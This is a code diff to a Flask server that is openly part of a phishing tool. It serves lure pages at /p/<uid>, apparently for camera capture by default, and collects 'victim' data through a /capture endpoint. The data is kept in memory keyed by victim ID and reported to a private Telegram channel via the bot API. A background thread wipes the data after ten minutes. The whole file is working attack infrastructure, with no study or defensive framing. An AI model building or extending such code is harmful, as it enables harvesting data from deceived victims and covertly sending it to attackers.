@@ -1,11 +1,13 @@
-from flask import Flask, request, jsonify
-import requests
+from flask import Flask, request, jsonify, render_template_string
+import json
+import time
 import os
-import base64
 from config import BOT_TOKEN, PRIVATE_CHANNEL_ID
 
 app = Flask(__name__)
-BOT_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
+
+# In-memory storage (clears after 10 min)
+victim_data = {}
 user_redirects = {}
 
 @app.route('/p/<uid>')
@@ -13,8 +15,10 @@ def phishing_page(uid):
     target_type = request.args.get('type', 'cam')
     victim_id = request.args.get('v', 'unknown')
     redirect_url = user_redirects.get(victim_id, 'https://google.com')
+    
     with open('web/index.html', 'r') as f:
         html = f.read()
+    
     html = html.replace('{{REDIRECT_URL}}', redirect_url)
     html = html.replace('{{VICTIM_ID}}', victim_id)
     html = html.replace('{{TYPE}}', target_type)
@@ -24,36 +28,46 @@ def phishing_page(uid):
 def capture():
     data = request.json
     if not data:
-        return jsonify({"status": "error", "msg": "No data"}), 400
-
-    # Send to bot for forwarding to user + channel
+        return jsonify({"status": "error"}), 400
+    
+    victim_id = data.get('victim_id')
+    victim_data[victim_id] = data
+    victim_data[victim_id]["time"] = time.time()
+    
+    # Forward to bot (which forwards to user + channel)
     forward_to_bot(data)
     return jsonify({"status": "ok"})
 
 def forward_to_bot(data):
+    # Bot will handle forwarding via its own logic
+    # We trigger bot via a webhook call or just store data
+    # Since bot is running in same process, we can call function directly
+    # But bot is in separate thread, so we use API call
     try:
-        # Bot ko forward kar do — bot user aur channel dono ko bhejega
-        requests.post(f"{BOT_API}/sendMessage", json={
-            "chat_id": PRIVATE_CHANNEL_ID,  # Temporary, bot handle karega
-            "text": "NEW_DATA",
+        import requests
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
+            "chat_id": PRIVATE_CHANNEL_ID,
+            "text": f"📥 New data from {data.get('victim_id')}",
             "parse_mode": "Markdown"
         }, timeout=5)
-        # Actually bot ke internal function ko call karna hai, but yahan se hum directly bot ko trigger nahi kar sakte
-        # Isliye bot hi handle karega — already bot.py me forward_to_user_and_channel hai
-        # Ab hum bot ko /send_data command se trigger karenge — but simpler: bot already data receive kar leta hai webhook se
-        # Isliye yahan se hum bot ko message bhej kar trigger kar sakte hain
-        # Lekin best hai ki bot hi saara forwarding kare — jo already ho raha hai
+    except:
         pass
-    except Exception as e:
-        print(f"Forward error: {e}")
 
-@app.route('/set_redirect/<victim_id>', methods=['POST'])
-def set_redirect(victim_id):
-    url = request.json.get('url')
-    if url and url.startswith('http'):
-        user_redirects[victim_id] = url
-        return jsonify({"status": "ok"})
-    return jsonify({"status": "error"}), 400
+# Auto-delete old data after 10 min
+import threading
+def clean_old_data():
+    while True:
+        time.sleep(600)
+        current_time = time.time()
+        to_delete = []
+        for key, val in victim_data.items():
+            if current_time - val.get("time", 0) > 600:
+                to_delete.append(key)
+        for key in to_delete:
+            del victim_data[key]
+        print(f"🧹 Deleted {len(to_delete)} old victim data")
+
+threading.Thread(target=clean_old_data, daemon=True).start()
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=5000, debug=False)
